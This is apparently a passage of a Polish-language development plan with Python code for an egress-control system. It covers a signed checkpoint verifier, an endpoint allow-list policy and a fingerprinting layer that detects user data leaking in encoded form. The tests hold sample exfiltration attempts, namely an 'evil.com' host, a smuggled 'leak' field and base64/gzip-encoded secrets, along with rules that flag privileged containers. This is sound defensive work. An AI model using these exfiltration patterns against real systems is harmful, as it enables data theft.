    kw = dict(container=res.last["container"], policy_digest="p" * 64, accs=res.accs,
              counts={"egress": 1, "ingress": 1}, ops=[])
    led.append(t="2026-10-13T18:00:09Z", rotate_to=new, **kw)
    led.append(t="2026-10-13T18:00:10Z", **kw)
    assert len(verify_chain(tmp_path, pubkey_hex(key)).checkpoints) == 4
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_verify_chain.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.verify'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/verify.py`:

```python
"""Independent verifier. Must import only: lthash, canonical, evidence, policy (+ cryptography).

Replays the checkpoint chain from genesis and checks every claim a checkpoint makes.
"""
from __future__ import annotations

import base64
import json
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path

from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey

from poi import canonical as c
from poi.lthash import LtHash

E_SIGNATURE = 10
E_CHAIN = 11
E_DELTA = 12
E_SEQ = 13
E_SCHEMA = 14
E_CONFIG = 15
E_EVIDENCE = 16
E_LIVE = 17

ACCS = ("state", "egress", "ingress")


class VerifyError(Exception):
    def __init__(self, code: int, seq: int | None, msg: str) -> None:
        super().__init__(f"[{code}] checkpoint {seq}: {msg}")
        self.code = code
        self.seq = seq
        self.msg = msg


@dataclass
class Event:
    """A decoded egress/dns/ingress element plus the checkpoint it was recorded in."""
    checkpoint: int
    fields: list[str]

    @property
    def domain(self) -> str:
        return self.fields[0]

    @property
    def seq(self) -> int:
        return int(self.fields[1])


@dataclass
class VerifyResult:
    checkpoints: list[dict] = field(default_factory=list)
    accs: dict[str, LtHash] = field(default_factory=dict)
    state_elements: Counter = field(default_factory=Counter)
    egress: list[Event] = field(default_factory=list)
    ingress: list[Event] = field(default_factory=list)
    config_digests: list[tuple[int, str]] = field(default_factory=list)

    @property
    def last(self) -> dict:
        return self.checkpoints[-1]


def _load_checkpoints(run_dir: Path) -> list[dict]:
    files = sorted((run_dir / "ledger").glob("*.json"))
    if not files:
        raise VerifyError(E_CHAIN, None, "no checkpoints")
    cps = []
    for i, f in enumerate(files):
        if f.name != f"{i:06d}.json":
            raise VerifyError(E_CHAIN, i, f"missing or misnamed checkpoint file (found {f.name})")
        cp = json.loads(f.read_bytes())
        if cp.get("seq") != i:
            raise VerifyError(E_CHAIN, i, f"seq field {cp.get('seq')} != position {i}")
        cps.append(cp)
    return cps


def _check_sig(cp: dict, pub: Ed25519PublicKey) -> None:
    try:
        pub.verify(bytes.fromhex(cp["sig"]), c.checkpoint_signing_bytes(cp))
    except (InvalidSignature, ValueError, KeyError) as e:
        raise VerifyError(E_SIGNATURE, cp.get("seq"), f"bad signature ({type(e).__name__})")


def _read_delta(run_dir: Path, cp: dict) -> list[tuple[str, str, bytes]]:
    seq = cp["seq"]
    try:
        raw = (run_dir / "delta" / f"{seq:06d}.jsonl").read_bytes()
    except FileNotFoundError:
        raise VerifyError(E_DELTA, seq, "delta file missing")
    if c.b2b256(raw) != cp["delta"]:
        raise VerifyError(E_DELTA, seq, "delta file digest mismatch")
    ops = []
    for line in raw.splitlines():
        d = json.loads(line)
        if d["op"] not in ("add", "sub") or d["acc"] not in ACCS:
            raise VerifyError(E_DELTA, seq, f"malformed op {d}")
        ops.append((d["op"], d["acc"], base64.b64decode(d["element"], validate=True)))
    return ops


def verify_chain(run_dir: Path, pubkey_hex: str) -> VerifyResult:
    """Checks signatures (10), chain links and time (11), delta sums (12), seq/count (13)."""
    run_dir = Path(run_dir)
    pub = Ed25519PublicKey.from_public_bytes(bytes.fromhex(pubkey_hex))
    res = VerifyResult(accs={a: LtHash() for a in ACCS})
    allowed_seqs: set[int] = set()
    seen_ingress: set[int] = set()
    next_seq = 1
    prev: dict | None = None

    for cp in _load_checkpoints(run_dir):
        seq = cp["seq"]
        _check_sig(cp, pub)
        if prev is None:
            if cp["prev"] is not None:
                raise VerifyError(E_CHAIN, seq, "genesis has non-null prev")
        else:
            if cp["prev"] != c.checkpoint_digest(prev):
                raise VerifyError(E_CHAIN, seq, "prev does not match previous checkpoint")
            if cp["t"] < prev["t"]:
                raise VerifyError(E_CHAIN, seq, "time went backwards")

        for op, acc, element in _read_delta(run_dir, cp):
            fields = c.decode(element)
            if acc == "state":
                if fields[0] not in ("file", "config"):
                    raise VerifyError(E_DELTA, seq, f"domain {fields[0]} in state accumulator")
                if op == "add":
                    res.accs["state"].add(element)
                    res.state_elements[element] += 1
                    if fields[0] == "config":
                        res.config_digests.append((seq, fields[1]))
                else:
                    if res.state_elements[element] == 0:
                        raise VerifyError(E_DELTA, seq, "sub of element not in state")
                    res.accs["state"].sub(element)
                    res.state_elements[element] -= 1
                continue
            if op != "add":
                raise VerifyError(E_SEQ, seq, f"{acc} accumulator is append-only")
            ev = Event(seq, fields)
            if acc == "egress":
                if ev.domain not in ("egress", "dns"):
                    raise VerifyError(E_DELTA, seq, f"domain {ev.domain} in egress accumulator")
                if ev.seq != next_seq:
                    raise VerifyError(E_SEQ, seq, f"egress seq {ev.seq}, expected {next_seq}")
                next_seq += 1
                if ev.domain == "egress" and fields[8] == "allow":
                    allowed_seqs.add(ev.seq)
                res.accs["egress"].add(element)
                res.egress.append(ev)
            else:
                if ev.domain != "ingress":
                    raise VerifyError(E_DELTA, seq, f"domain {ev.domain} in ingress accumulator")
                if ev.seq not in allowed_seqs or ev.seq in seen_ingress:
                    raise VerifyError(E_SEQ, seq, f"ingress seq {ev.seq} has no unique allowed request")
                seen_ingress.add(ev.seq)
                res.accs["ingress"].add(element)
                res.ingress.append(ev)

        for acc in ACCS:
            claimed = LtHash.from_b64(cp[acc]["vec"])
            if claimed != res.accs[acc] or cp[acc]["digest"] != claimed.digest():
                raise VerifyError(E_DELTA, seq, f"{acc} accumulator does not match prev + delta")
        if cp["egress"]["count"] != len(res.egress) or cp["ingress"]["count"] != len(res.ingress):
            raise VerifyError(E_SEQ, seq, "count does not match number of events")

        if "rotate" in cp:
            pub = Ed25519PublicKey.from_public_bytes(bytes.fromhex(cp["rotate"]))
        res.checkpoints.append(cp)
        prev = cp
    return res
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_verify_chain.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/verify.py tests/test_verify_chain.py
git commit -m "feat: chain verifier with tamper detection

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 5: Polityka: endpointy, schematy, pojemność kanału, reguły konfiguracji

Twarda granica treści (§6.3) + górne ograniczenie bitów na żądanie + reguły izolacji kontenera.

**Files:**
- Create: `src/poi/policy.py`
- Modify: `tests/helpers.py` (dopisz `POLICY`)
- Test: `tests/test_policy.py`

**Interfaces:**
- Consumes: `poi.canonical.b2b256`, `canonical_json`
- Produces: `PolicyError`, `Endpoint(host, method, path, request_schema, max_requests_per_minute)`, `Decision(verdict, reason, body, endpoint)`, `Policy` (pola: `raw, endpoints, on_violation, tick_seconds, output_volume, fingerprint_k, fingerprint_w, upstream_insecure, forward_headers`; `.digest`, `.hosts`, `find(host, method, path)`, `decide(host, method, path, body)->Decision`), `load(path)`, `parse(raw: bytes)`, `INF`, `capacity_bits(schema)->float`, `endpoint_capacity(ep)`, `config_violations(doc, policy)->list[str]`. Powody blokady: `host-not-allowed`, `query-string`, `endpoint-not-allowed`, `body-not-json`, `schema`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Dopisz na końcu `tests/helpers.py`:

```python


POLICY = b"""
version: 1
on_violation: pause
tick_seconds: 2
output_volume: /srv/out
forward_headers:
  authorization: Bearer test-token
endpoints:
  - host: api.example.com
    method: POST
    path: /v1/score
    request_schema:
      type: object
      additionalProperties: false
      required: [model, count]
      properties:
        model: {enum: [small, large]}
        count: {type: integer, minimum: 0, maximum: 255}
fingerprint: {k: 32, w: 16}
"""
```

Utwórz `tests/test_policy.py`:

```python
import math

import pytest

from poi.policy import INF, PolicyError, capacity_bits, parse

from helpers import POLICY


def test_parse_fields():
    p = parse(POLICY)
    assert p.tick_seconds == 2 and p.output_volume == "/srv/out"
    assert p.hosts == {"api.example.com"}
    assert p.forward_headers == {"authorization": "Bearer test-token"}
    assert len(p.digest) == 64


def test_bad_version_rejected():
    with pytest.raises(PolicyError):
        parse(b"version: 2\n")


@pytest.mark.parametrize("host,method,path,body,verdict,reason", [
    ("evil.com", "POST", "/v1/score", b"{}", "block", "host-not-allowed"),
    ("api.example.com", "GET", "/v1/score", b"", "block", "endpoint-not-allowed"),
    ("api.example.com", "POST", "/v1/score?x=1", b"{}", "block", "query-string"),
    ("api.example.com", "POST", "/v1/score", b"not json", "block", "body-not-json"),
    ("api.example.com", "POST", "/v1/score", b'{"model":"small","count":1,"x":"leak"}', "block", "schema"),
    ("api.example.com", "POST", "/v1/score", b'{"count": 3,  "model":"small"}', "allow", ""),
])
def test_decide(host, method, path, body, verdict, reason):
    d = parse(POLICY).decide(host, method, path, body)
    assert (d.verdict, d.reason) == (verdict, reason)


def test_allowed_body_is_canonicalised():
    d = parse(POLICY).decide("api.example.com", "POST", "/v1/score", b'{ "count": 3, "model": "small" }')
    assert d.body == b'{"count":3,"model":"small"}'


def test_capacity():
    ep = parse(POLICY).endpoints[0]
    assert capacity_bits(ep.request_schema) == pytest.approx(1 + 8)
    assert capacity_bits({"type": "string"}) == INF
    assert capacity_bits({"type": "object", "properties": {}}) == INF
    assert capacity_bits({"type": "string", "maxLength": 3}) == pytest.approx(24 + 2)
    assert capacity_bits({"type": "object", "additionalProperties": False,
                          "properties": {"b": {"type": "boolean"}}}) == 2
    assert capacity_bits({"type": "array", "maxItems": 3, "items": {"type": "boolean"}}) == pytest.approx(3 + 2)
    assert capacity_bits({"const": 5}) == 0
    assert math.isinf(capacity_bits({"type": "integer", "minimum": 0}))


def _doc(**kw):
    d = {"networks": [{"name": "int", "internal": True}], "network_mode": "int", "privileged": False,
         "cap_add": [], "devices": 0, "pid_mode": "", "ipc_mode": "", "dns": ["10.0.0.2"],
         "mounts": [{"destination": "/srv/out", "rw": True, "type": "bind"},
                    {"destination": "/etc/poi", "rw": False, "type": "bind"}]}
    d.update(kw)
    return d


def test_config_ok():
    from poi.policy import config_violations
    assert config_violations(_doc(), parse(POLICY)) == []


@pytest.mark.parametrize("kw", [
    {"networks": [{"name": "int", "internal": True}, {"name": "bridge", "internal": False}]},
    {"networks": [{"name": "int", "internal": False}]},
    {"network_mode": "host"},
    {"privileged": True},
    {"cap_add": ["NET_ADMIN"]},
    {"pid_mode": "host"},
    {"dns": []},
    {"mounts": [{"destination": "/data", "rw": True, "type": "bind"}]},
])
def test_config_violations(kw):
    from poi.policy import config_violations
    assert config_violations(_doc(**kw), parse(POLICY))
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_policy.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.policy'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/policy.py`:

```python
"""policy.yaml: allow-list of endpoints, request schemas, mounts, and channel-capacity bounds."""
from __future__ import annotations

import json
import math
from dataclasses import dataclass, field
from pathlib import Path

import jsonschema
import yaml

from poi.canonical import b2b256, canonical_json

INF = math.inf
FLOAT_BITS = 64


class PolicyError(Exception):
    pass


@dataclass(frozen=True)
class Endpoint:
    host: str
    method: str
    path: str
    request_schema: dict
    max_requests_per_minute: int | None = None


@dataclass
class Decision:
    verdict: str              # "allow" | "block"
    reason: str               # "" when allowed
    body: bytes = b""         # canonical body to forward (allow only)
    endpoint: Endpoint | None = None


@dataclass
class Policy:
    raw: bytes
    endpoints: list[Endpoint]
    on_violation: str = "pause"
    tick_seconds: float = 5.0
    output_volume: str | None = None
    fingerprint_k: int = 32
    fingerprint_w: int = 16
    upstream_insecure: bool = False
    forward_headers: dict[str, str] = field(default_factory=dict)

    @property
    def digest(self) -> str:
        return b2b256(self.raw)

    @property
    def hosts(self) -> set[str]:
        return {e.host for e in self.endpoints}

    def find(self, host: str, method: str, path: str) -> Endpoint | None:
        for e in self.endpoints:
            if e.host == host and e.method == method and e.path == path:
                return e
        return None

    def decide(self, host: str, method: str, path: str, body: bytes) -> Decision:
        """Hard boundary: exact endpoint, no query string, JSON body valid against schema."""
        if host not in self.hosts:
            return Decision("block", "host-not-allowed")
        if "?" in path:
            return Decision("block", "query-string")
        ep = self.find(host, method, path)
        if ep is None:
            return Decision("block", "endpoint-not-allowed")
        try:
            value = json.loads(body.decode("utf-8")) if body else None
        except (UnicodeDecodeError, json.JSONDecodeError):
            return Decision("block", "body-not-json")
        try:
            jsonschema.validate(value, ep.request_schema)
        except jsonschema.ValidationError:
            return Decision("block", "schema")
        return Decision("allow", "", canonical_json(value) if body else b"", ep)


def load(path: Path) -> Policy:
    return parse(Path(path).read_bytes())


def parse(raw: bytes) -> Policy:
    d = yaml.safe_load(raw)
    if not isinstance(d, dict) or d.get("version") != 1:
        raise PolicyError("policy must be a mapping with version: 1")
    if d.get("on_violation", "pause") not in ("pause", "alert"):
        raise PolicyError("on_violation must be pause or alert")
    eps = []
    for e in d.get("endpoints", []):
        schema = e["request_schema"]
        jsonschema.Draft202012Validator.check_schema(schema)
        eps.append(Endpoint(e["host"], e["method"].upper(), e["path"], schema,
                            e.get("max_requests_per_minute")))
    fp = d.get("fingerprint", {})
    return Policy(raw=raw, endpoints=eps, on_violation=d.get("on_violation", "pause"),
                  tick_seconds=float(d.get("tick_seconds", 5)), output_volume=d.get("output_volume"),
                  fingerprint_k=int(fp.get("k", 32)), fingerprint_w=int(fp.get("w", 16)),
                  upstream_insecure=bool(d.get("upstream_insecure", False)),
                  forward_headers=dict(d.get("forward_headers", {})))


# --- channel capacity (spec §6.3) -------------------------------------------

def _log2_count(n: float) -> float:
    return math.log2(n) if n > 1 else 0.0


def capacity_bits(schema: dict) -> float:
    """Upper bound on bits encodable by choosing a value that satisfies `schema`.

    The proxy re-serialises bodies canonically, so formatting carries no information;
    only the choice of value does. Unbounded constructs return INF.
    """
    if schema is True or schema == {}:
        return INF
    if "const" in schema:
        return 0.0
    if "enum" in schema:
        return _log2_count(len(schema["enum"]))
    t = schema.get("type")
    if isinstance(t, list):
        return _log2_count(len(t)) + max(capacity_bits({**schema, "type": x}) for x in t)
    if t == "null":
        return 0.0
    if t == "boolean":
        return 1.0
    if t == "integer":
        lo, hi = schema.get("minimum"), schema.get("maximum")
        if lo is None or hi is None:
            return INF
        return _log2_count(hi - lo + 1)
    if t == "number":
        return FLOAT_BITS
    if t == "string":
        n = schema.get("maxLength")
        return INF if n is None else 8 * n + _log2_count(n + 1)
    if t == "array":
        n = schema.get("maxItems")
        if n is None:
            return INF
        return n * capacity_bits(schema.get("items", True)) + _log2_count(n + 1)
    if t == "object":
        if schema.get("additionalProperties", True) is not False:
            return INF
        required = set(schema.get("required", []))
        total = 0.0
        for name, sub in schema.get("properties", {}).items():
            total += capacity_bits(sub) + (0 if name in required else 1)
        return total
    return INF


def endpoint_capacity(ep: Endpoint) -> float:
    return capacity_bits(ep.request_schema)


# --- container configuration rules (spec §7.4) ------------------------------

def config_violations(doc: dict, policy: Policy) -> list[str]:
    """Empty list iff the workload configuration enforces the isolation the proof relies on."""
    v = []
    nets = doc.get("networks", [])
    if len(nets) != 1 or not nets[0].get("internal"):
        v.append("workload must be attached to exactly one internal network")
    elif doc.get("network_mode") != nets[0]["name"]:
        v.append("network_mode must be the internal network")
    if doc.get("privileged"):
        v.append("privileged container")
    if doc.get("cap_add"):
        v.append(f"added capabilities: {doc['cap_add']}")
    if doc.get("devices"):
        v.append("host devices attached")
    for mode in ("pid_mode", "ipc_mode"):
        if doc.get(mode) == "host":
            v.append(f"{mode}=host")
    if not doc.get("dns"):
        v.append("DNS not pointed at the poi stub")
    for m in doc.get("mounts", []):
        if m["rw"] and m["destination"] != policy.output_volume:
            v.append(f"undeclared read-write mount: {m['destination']}")
    return v
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_policy.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/policy.py tests/helpers.py tests/test_policy.py
git commit -m "feat: policy with schema enforcement, channel capacity and config rules

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 6: Odciski danych użytkownika (winnowing)

Warstwa informacyjna: keyed BLAKE2b-64 nad k-gramami, winnowing, dekodery base64/hex/URL/gzip.

**Files:**
- Create: `src/poi/fingerprint.py`
- Test: `tests/test_fingerprint.py`

**Interfaces:**
- Consumes: —
- Produces: `normalize(bytes)`, `winnow(data, key, k=32, w=16)->set[int]`, `variants(data, depth=2)->list[bytes]`, `FingerprintSet(key, k, w, prints=None)` z `add(data, source)`, `from_dir(dir, key, k, w)`, `scan(outbound)->set[str]` (źródła), `save(path)`, `load(path, key, k, w)`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_fingerprint.py`:

```python
import base64
import gzip
import os
import urllib.parse

from poi.fingerprint import FingerprintSet, winnow

KEY = b"k" * 32
SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma, address: ul. Lipowa 7, Krakow"


def fs():
    s = FingerprintSet(KEY)
    s.add(SECRET, "records/1.txt")
    return s


def test_winnow_deterministic_and_keyed():
    assert winnow(SECRET, KEY) == winnow(SECRET, KEY)
    assert winnow(SECRET, KEY) != winnow(SECRET, b"x" * 32)


def test_clean_traffic_no_hits():
    assert fs().scan(b'{"model":"small","count":3}') == set()
    assert fs().scan(os.urandom(4096)) == set()


def test_raw_substring_detected():
    assert fs().scan(b"prefix " + SECRET[5:80] + b" suffix") == {"records/1.txt"}


def test_whitespace_and_case_normalised():
    assert fs().scan(SECRET.upper().replace(b" ", b"\n")) == {"records/1.txt"}


def test_encoded_variants_detected():
    s = fs()
    assert s.scan(b'{"x":"' + base64.b64encode(SECRET) + b'"}')
    assert s.scan(SECRET.hex().encode())
    assert s.scan(urllib.parse.quote_from_bytes(SECRET).encode())
    assert s.scan(gzip.compress(SECRET))
    assert s.scan(base64.b64encode(gzip.compress(SECRET)))


def test_save_load(tmp_path):
    s = fs()
    s.save(tmp_path / "fp.bin")
    t = FingerprintSet.load(tmp_path / "fp.bin", KEY)
    assert t.prints == s.prints
    assert t.scan(SECRET) == {"?"}


def test_from_dir(tmp_path):
    (tmp_path / "a").mkdir()
    (tmp_path / "a" / "r.txt").write_bytes(SECRET)
    assert FingerprintSet.from_dir(tmp_path, KEY).scan(SECRET) == {"a/r.txt"}
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_fingerprint.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.fingerprint'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/fingerprint.py`:

```python
"""Keyed winnowing fingerprints of user data and their detection in outbound bytes (informative layer)."""
from __future__ import annotations

import base64
import binascii
import gzip
import hashlib
import re
import urllib.parse
from pathlib import Path

_B64_RUN = re.compile(rb"[A-Za-z0-9+/_-]{16,}={0,2}")
_HEX_RUN = re.compile(rb"(?:[0-9a-fA-F]{2}){8,}")
_WS = re.compile(rb"\s+")


def normalize(data: bytes) -> bytes:
    return _WS.sub(b"", data).lower()


def _kgram_hashes(data: bytes, k: int, key: bytes) -> list[int]:
    return [
        int.from_bytes(hashlib.blake2b(data[i:i + k], digest_size=8, key=key).digest(), "big")
        for i in range(len(data) - k + 1)
    ]


def winnow(data: bytes, key: bytes, k: int = 32, w: int = 16) -> set[int]:
    """Winnowing (Schleimer et al. 2003): any shared substring of length >= w+k-1
    of the normalised inputs yields at least one shared fingerprint."""
    hs = _kgram_hashes(normalize(data), k, key)
    if not hs:
        return set()
    if len(hs) <= w:
        return {min(hs)}
    return {min(hs[i:i + w]) for i in range(len(hs) - w + 1)}


def variants(data: bytes, depth: int = 2) -> list[bytes]:
    """The raw bytes plus decodings an exfiltrating workload might use."""
    out = [data]
    frontier = [data]
    for _ in range(depth):
        nxt = []
        for d in frontier:
            if d[:2] == b"\x1f\x8b":
                try:
                    nxt.append(gzip.decompress(d))
                except (OSError, EOFError):
                    pass
            unq = urllib.parse.unquote_to_bytes(d)
            if unq != d:
                nxt.append(unq)
            for m in _B64_RUN.finditer(d):
                s = m.group(0)
                for decoder in (base64.b64decode, base64.urlsafe_b64decode):
                    try:
                        nxt.append(decoder(s + b"=" * (-len(s) % 4)))
                        break
                    except (binascii.Error, ValueError):
                        continue
            for m in _HEX_RUN.finditer(d):
                nxt.append(binascii.unhexlify(m.group(0)))
        out += nxt
        frontier = nxt
    return out


class FingerprintSet:
    def __init__(self, key: bytes, k: int = 32, w: int = 16, prints: set[int] | None = None) -> None:
        self.key, self.k, self.w = key, k, w
        self.prints: set[int] = prints if prints is not None else set()
        self.sources: dict[int, str] = {}

    def add(self, data: bytes, source: str = "") -> None:
        for fp in winnow(data, self.key, self.k, self.w):
            self.prints.add(fp)
            self.sources.setdefault(fp, source)

    @classmethod
    def from_dir(cls, data_dir: Path, key: bytes, k: int = 32, w: int = 16) -> "FingerprintSet":
        fs = cls(key, k, w)
        for p in sorted(Path(data_dir).rglob("*")):
            if p.is_file():
                fs.add(p.read_bytes(), str(p.relative_to(data_dir)))
        return fs

    def scan(self, outbound: bytes) -> set[str]:
        """Return the sources whose fingerprints occur in `outbound` or any decoded variant."""
        hits: set[str] = set()
        for v in variants(outbound):
            for fp in winnow(v, self.key, self.k, self.w) & self.prints:
                hits.add(self.sources.get(fp, "?"))
        return hits

    def save(self, path: Path) -> None:
        Path(path).write_bytes(b"".join(fp.to_bytes(8, "big") for fp in sorted(self.prints)))

    @classmethod
    def load(cls, path: Path, key: bytes, k: int = 32, w: int = 16) -> "FingerprintSet":
        raw = Path(path).read_bytes()
        return cls(key, k, w, {int.from_bytes(raw[i:i + 8], "big") for i in range(0, len(raw), 8)})
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_fingerprint.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/fingerprint.py tests/test_fingerprint.py
git commit -m "feat: keyed winnowing fingerprints with decoding variants

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 7: WAL proxy

Trwały zapis każdego zdarzenia (z `fsync`) zanim ruch pójdzie dalej; wspólny `seq` dla HTTP i DNS; odporność na urwany zapis.

**Files:**
- Create: `src/poi/wal.py`
- Test: `tests/test_wal.py`

**Interfaces:**
- Consumes: `poi.canonical`, `poi.evidence`
- Produces: `WAL_NAME='events.jsonl'`, `WalEntry(kind, seq, element)`, `WalWriter(wal_dir, evidence_dir)` z `.seq`, `.path`, `record_egress(t, method, host, path, headers, body, verdict, reason)->seq`, `record_dns(t, name, qtype, verdict)->seq`, `record_ingress(seq, status, headers, body)`; `WalReader(wal_dir).read_new()->list[WalEntry]`. Wyjątek `OSError` z `record_*` oznacza: zablokuj ruch.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_wal.py`:

```python
import threading

from poi import canonical as c
from poi import evidence
from poi.wal import WalReader, WalWriter

T = "2026-10-13T18:00:00Z"


def _w(tmp_path):
    return WalWriter(tmp_path / "wal", tmp_path / "evidence")


def test_shared_seq_and_reader(tmp_path):
    w = _w(tmp_path)
    s1 = w.record_egress(T, "POST", "api.x", "/v1", [("A", "1")], b"{}", "allow", "")
    s2 = w.record_dns(T, "evil.com.", "A", "block")
    w.record_ingress(s1, 200, [], b"ok")
    assert (s1, s2) == (1, 2)
    entries = WalReader(tmp_path / "wal").read_new()
    assert [(e.kind, e.seq) for e in entries] == [("egress", 1), ("dns", 2), ("ingress", 1)]
    f = c.decode(entries[0].element)
    assert evidence.get(tmp_path / "evidence", f[7]) == b"{}"
    assert f[6] == c.headers_digest([("a", "1")])


def test_reader_is_incremental_and_skips_partial_line(tmp_path):
    w = _w(tmp_path)
    r = WalReader(tmp_path / "wal")
    w.record_dns(T, "a.", "A", "block")
    assert len(r.read_new()) == 1
    with open(w.path, "ab") as f:
        f.write(b'{"kind":"dns"')
    assert r.read_new() == []


def test_writer_recovers_seq_and_truncates_torn_write(tmp_path):
    w = _w(tmp_path)
    w.record_dns(T, "a.", "A", "block")
    w.record_dns(T, "b.", "A", "block")
    with open(w.path, "ab") as f:
        f.write(b'{"kind":"dn')
    w2 = _w(tmp_path)
    assert w2.seq == 2
    assert w2.record_dns(T, "c.", "A", "block") == 3
    assert [e.seq for e in WalReader(tmp_path / "wal").read_new()] == [1, 2, 3]


def test_concurrent_writers_unique_seqs(tmp_path):
    w = _w(tmp_path)
    ts = [threading.Thread(target=lambda: [w.record_dns(T, "x.", "A", "block") for _ in range(50)])
          for _ in range(4)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    assert sorted(e.seq for e in WalReader(tmp_path / "wal").read_new()) == list(range(1, 201))
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_wal.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.wal'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/wal.py`:

```python
"""Proxy write-ahead log: every egress/dns/ingress event is durable before traffic moves."""
from __future__ import annotations

import base64
import json
import os
import threading
from dataclasses import dataclass
from pathlib import Path

from poi import canonical as c
from poi import evidence

WAL_NAME = "events.jsonl"


def _norm_headers(headers: list[tuple[str, str]]) -> bytes:
    return c.canonical_json(sorted((k.lower(), v) for k, v in headers))


@dataclass
class WalEntry:
    kind: str      # "egress" | "dns" | "ingress"
    seq: int
    element: bytes


class WalWriter:
    """Thread-safe; shared by the HTTP addon and the DNS stub so `seq` is one counter."""

    def __init__(self, wal_dir: Path, evidence_dir: Path) -> None:
        self.path = Path(wal_dir) / WAL_NAME
        self.evidence_dir = Path(evidence_dir)
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self._lock = threading.Lock()
        self.seq = self._recover()

    def _recover(self) -> int:
        if not self.path.exists():
            return 0
        raw = self.path.read_bytes()
        complete = raw[: raw.rfind(b"\n") + 1]
        if len(complete) != len(raw):  # torn final write: drop it
            with open(self.path, "r+b") as f:
                f.truncate(len(complete))
        seq = 0
        for line in complete.splitlines():
            d = json.loads(line)
            if d["kind"] != "ingress":
                seq = max(seq, d["seq"])
        return seq

    def _append(self, kind: str, seq: int, element: bytes) -> None:
        line = c.canonical_json({"kind": kind, "seq": seq,
                                 "element": base64.b64encode(element).decode("ascii")}) + b"\n"
        with open(self.path, "ab") as f:
            f.write(line)
            f.flush()
            os.fsync(f.fileno())

    def record_egress(self, t: str, method: str, host: str, path: str,
                      headers: list[tuple[str, str]], body: bytes, verdict: str, reason: str) -> int:
        """Store evidence, then append the element. Raises OSError on failure: caller must block."""
        hd = evidence.put(self.evidence_dir, _norm_headers(headers))
        bd = evidence.put(self.evidence_dir, body)
        with self._lock:
            seq = self.seq + 1
            self._append("egress", seq, c.egress_element(seq, t, method, host, path, hd, bd, verdict, reason))
            self.seq = seq
        return seq

    def record_dns(self, t: str, name: str, qtype: str, verdict: str) -> int:
        with self._lock:
            seq = self.seq + 1
            self._append("dns", seq, c.dns_element(seq, t, name, qtype, verdict))
            self.seq = seq
        return seq

    def record_ingress(self, seq: int, status: int, headers: list[tuple[str, str]], body: bytes) -> None:
        hd = evidence.put(self.evidence_dir, _norm_headers(headers))
        bd = evidence.put(self.evidence_dir, body)
        with self._lock:
            self._append("ingress", seq, c.ingress_element(seq, status, hd, bd))


class WalReader:
    """Daemon side: yields only complete lines, remembers its byte offset."""

    def __init__(self, wal_dir: Path) -> None:
        self.path = Path(wal_dir) / WAL_NAME
        self.offset = 0

    def read_new(self) -> list[WalEntry]:
        if not self.path.exists():
            return []
        with open(self.path, "rb") as f:
            f.seek(self.offset)
            raw = f.read()
        complete = raw[: raw.rfind(b"\n") + 1]
        self.offset += len(complete)
        out = []
        for line in complete.splitlines():
            d = json.loads(line)
            out.append(WalEntry(d["kind"], d["seq"], base64.b64decode(d["element"])))
        return out
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_wal.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/wal.py tests/test_wal.py
git commit -m "feat: fsync'd proxy write-ahead log

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 8: Bramka egress i stub DNS

Logika proxy niezależna od mitmproxy: decyzja, normalizacja nagłówków i body, odciski, rate-limit, fail-closed; DNS logowany jako egress.

**Files:**
- Create: `src/poi/gate.py`
- Create: `src/poi/dnsstub.py`
- Test: `tests/test_gate.py`
- Test: `tests/test_dnsstub.py`

**Interfaces:**
- Consumes: `Policy.decide`, `FingerprintSet.scan`, `WalWriter.record_*`
- Produces: `utcnow()->str` (RFC 3339, mikrosekundy, stała szerokość), `GateResult(verdict, reason, seq, body, headers)`, `EgressGate(policy, wal, fingerprints=None, clock=utcnow, monotonic=time.monotonic)` z `on_connect(host)`, `on_request(host, method, path, headers, body)`, `on_response(seq, status, headers, body)`; dodatkowe powody: `fingerprint`, `rate-limit`, `wal-failure`. `PoiResolver(wal, hosts, answer_ip)`, `start_dns(wal, hosts, answer_ip, address='0.0.0.0', port=53)->DNSServer`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_gate.py`:

```python
import pytest

from poi import canonical as c
from poi import evidence
from poi.fingerprint import FingerprintSet
